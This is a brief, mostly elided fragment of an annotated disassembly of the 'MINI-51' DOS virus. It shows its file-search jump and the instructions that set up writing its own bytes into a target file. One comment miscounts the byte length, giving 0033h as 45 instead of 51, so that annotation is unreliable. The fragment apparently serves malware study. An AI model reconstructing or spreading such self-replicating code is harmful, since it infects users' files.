;***************************************************************
;             DISASSEMBLY of the MINI-51 VIRUS
;***************************************************************
...
FIRST_FILE:
     ...
     JC  NEXT_MATCH        ;search for next match
;****************************************************************
...
;****************************************************************
     ...
     MOV DX, 0100h         ;point to buffer of data to write, i.e.
                           ;to myself
     MOV CX, 0033h         ;#of bytes to write. 45d bytes
